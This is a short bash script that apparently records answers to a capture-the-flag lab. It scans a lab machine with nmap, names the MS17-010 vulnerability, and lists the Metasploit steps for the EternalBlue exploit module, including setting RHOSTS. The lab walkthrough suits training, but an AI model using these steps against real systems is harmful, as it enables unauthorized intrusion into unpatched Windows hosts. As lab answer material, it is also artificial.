#!/bin/bash

# URL to to attack
MACHINE_IP=10.10.141.33

case "$1" in
  # How many ports under 1000
  1)
    nmap $MACHINE_IP
    echo "3 Ports under 1000"
    ;;
  # What is this machine vulnerable to?
  2)
    echo "ms17-010"
    ;;
  # Find explotation code against the machine
  3)
    echo "Initiate metasploit -> msfconsole"
    echo "Search for vulnerability -> search ms17-010"
    echo "Solution -> exploit/windows/smb/ms17_010_eternalblue"
    ;;
  # Discover required option
  4)
    echo "Select the exploit that we discover before -> use exploit/xxx"
    echo "Run the commoand -> show options"
    echo "Solution -> Missing required param RHOSTS"
    echo "Set the variable -> set RHOSTS $MACHINE_IP"
    ;;
  # Run the exploit
  *)
    echo "Select proper step"
    ;;
esac
